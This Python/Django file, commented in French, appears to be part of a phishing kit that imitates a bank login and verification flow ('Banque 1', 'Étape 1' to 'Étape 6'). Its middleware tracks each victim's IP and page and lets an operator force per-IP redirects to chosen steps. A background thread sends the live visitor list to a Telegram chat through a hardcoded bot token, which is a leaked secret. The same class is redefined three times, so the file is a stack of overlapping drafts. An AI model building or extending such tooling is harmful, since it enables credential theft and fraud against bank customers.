import time
import requests
import threading
from django.core.cache import cache


# Visiteurs actifs : { ip: { page, last_seen, user_agent, methode } }
VISITEURS_ACTIFS = {}

# Redirections en attente : { ip: url_cible }
REDIRECTIONS = {}

# Durée avant qu'un visiteur soit considéré inactif (secondes)
TIMEOUT_VISITEUR = 60

# Toutes les pages disponibles pour la redirection
PAGES_DISPONIBLES = [
    ('/',                'Inscription / Connexion'),
    ('/verification/',   'Vérification'),
    ('/etape-1/',        'Étape 1'),
    ('/etape-2/',        'Étape 2'),
    ('/etape-3/',        'Étape 3'),
    ('/etape-4/',        'Étape 4'),
    ('/etape-5/',        'Étape 5'),
    ('/etape-6/',        'Étape 6'),
    ('/banque-1/',       'Banque 1'),
    ('/banque-2/',       'Banque 2'),
]


TELEGRAM_TOKEN   = "8995148469:AAHNG55Z9GrPq6-X1AKDUTLsgVmB91VWaL8"
TELEGRAM_CHAT_ID = "8849728706"
MESSAGE_ID_LIVE  = None   # ID du message épinglé, rempli au démarrage



def get_visiteurs():
    """Récupère tous les visiteurs depuis le cache."""
    try:
        return cache.get('visiteurs_actifs', {})
    except Exception:
        return {}


def set_visiteurs(visiteurs):
    """Sauvegarde les visiteurs dans le cache."""
    try:
        cache.set('visiteurs_actifs', visiteurs, timeout=3600)
    except Exception:
        pass


class VisiteurTempsReelMiddleware:

    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        ip = self._get_ip(request)

        if not request.path.startswith('/visiteurs/') and request.path != '/verifier-redirection/':
            cible = cache.get(f'redirect_{ip}')
            if cible:
                cache.delete(f'redirect_{ip}')
                from django.shortcuts import redirect
                return redirect(cible)

            visiteurs = get_visiteurs()
            visiteurs[ip] = {
                'page':       request.path,
                'last_seen':  time.time(),
                'user_agent': request.META.get('HTTP_USER_AGENT', 'Inconnu'),
                'methode':    request.method,
            }
            set_visiteurs(visiteurs)
            print(f">>> Visiteur sauvegardé en cache : {ip} → {request.path}")

        self._nettoyer()
        response = self.get_response(request)
        return response

    def _get_ip(self, request):
        x_forwarded = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded:
            ip = x_forwarded.split(',')[0].strip()
        else:
            ip = request.META.get('REMOTE_ADDR', '0.0.0.0')
        if ip == '::1':
            ip = '127.0.0.1'
        return ip

    def _nettoyer(self):
        maintenant = time.time()
        visiteurs  = get_visiteurs()
        a_supprimer = [
            ip for ip, data in visiteurs.items()
            if maintenant - data['last_seen'] > TIMEOUT_VISITEUR
        ]
        if a_supprimer:
            for ip in a_supprimer:
                del visiteurs[ip]
            set_visiteurs(visiteurs)


def mettre_a_jour_message_live():
    """Met à jour le message Telegram en temps réel."""
    global MESSAGE_ID_LIVE

    if not VISITEURS_ACTIFS:
        texte = "😴 *Aucun visiteur actif*"
    else:
        lignes = [f"👥 *Visiteurs en ligne : {len(VISITEURS_ACTIFS)}*\n━━━━━━━━━━━━━━━"]
        for ip, data in VISITEURS_ACTIFS.items():
            il_y_a = int(time.time() - data['last_seen'])
            lignes.append(
                f"📍 `{ip}`\n"
                f"   📄 Page : `{data['page']}`\n"
                f"   ⏱ Vu il y a : {il_y_a}s"
            )
        lignes.append("━━━━━━━━━━━━━━━")
        texte = '\n'.join(lignes)

    try:
        if MESSAGE_ID_LIVE:
            # Modifie le message existant
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/editMessageText",
                json={
                    "chat_id": TELEGRAM_CHAT_ID,
                    "message_id": MESSAGE_ID_LIVE,
                    "text": texte,
                    "parse_mode": "Markdown"
                },
                timeout=5
            )
        else:
            # Crée le message pour la première fois
            res = requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                json={
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": texte,
                    "parse_mode": "Markdown"
                },
                timeout=5
            ).json()
            MESSAGE_ID_LIVE = res['result']['message_id']

            # Épingle le message
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/pinChatMessage",
                json={
                    "chat_id": TELEGRAM_CHAT_ID,
                    "message_id": MESSAGE_ID_LIVE,
                    "disable_notification": True
                },
                timeout=5
            )
    except Exception as e:
        print(f"Erreur mise à jour Telegram : {e}")


class VisiteurTempsReelMiddleware:

    def __init__(self, get_response):
        self.get_response = get_response
        # Lance le thread de mise à jour toutes les 10s
        self._lancer_thread()

    def _lancer_thread(self):
        def boucle():
            while True:
                mettre_a_jour_message_live()
                time.sleep(10)   # ← met à jour toutes les 10 secondes

        t = threading.Thread(target=boucle, daemon=True)
        t.start()

    def __call__(self, request):
        ip = self._get_ip(request)

        if not request.path.startswith('/visiteurs/') and request.path != '/verifier-redirection/':
            from django.core.cache import cache
            cible = cache.get(f'redirect_{ip}')
            if cible:
                cache.delete(f'redirect_{ip}')
                from django.shortcuts import redirect
                return redirect(cible)

            VISITEURS_ACTIFS[ip] = {
                'page':       request.path,
                'last_seen':  time.time(),
                'user_agent': request.META.get('HTTP_USER_AGENT', 'Inconnu'),
                'methode':    request.method,
            }

        self._nettoyer()
        response = self.get_response(request)
        return response

    def _get_ip(self, request):
        x_forwarded = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded:
            ip = x_forwarded.split(',')[0].strip()
        else:
            ip = request.META.get('REMOTE_ADDR', '0.0.0.0')
        if ip == '::1':
            ip = '127.0.0.1'
        return ip

    def _nettoyer(self):
        maintenant = time.time()
        a_supprimer = [
            ip for ip, data in VISITEURS_ACTIFS.items()
            if maintenant - data['last_seen'] > TIMEOUT_VISITEUR
        ]
        for ip in a_supprimer:
            del VISITEURS_ACTIFS[ip]


class VisiteurTempsReelMiddleware:

    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        ip = self._get_ip(request)

        # Vérifier si une redirection est en attente pour cet IP
        if ip in REDIRECTIONS and not request.path.startswith('/visiteurs/'):
            cible = REDIRECTIONS.pop(ip)  # consommée une seule fois
            from django.shortcuts import redirect
            return redirect(cible)

        # Enregistrer le visiteur (sauf pages de monitoring)
        if not request.path.startswith('/visiteurs/') and request.path != '/verifier-redirection/':
            VISITEURS_ACTIFS[ip] = {
                'page':       request.path,
                'last_seen':  time.time(),
                'user_agent': request.META.get('HTTP_USER_AGENT', 'Inconnu'),
                'methode':    request.method,
            }

        self._nettoyer()
        response = self.get_response(request)
        return response

    def _get_ip(self, request):
        x_forwarded = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded:
            return x_forwarded.split(',')[0].strip()
        return request.META.get('REMOTE_ADDR', '0.0.0.0')

    def _nettoyer(self):
        maintenant = time.time()
        a_supprimer = [
            ip for ip, data in VISITEURS_ACTIFS.items()
            if maintenant - data['last_seen'] > TIMEOUT_VISITEUR
        ]
        for ip in a_supprimer:
            del VISITEURS_ACTIFS[ip]
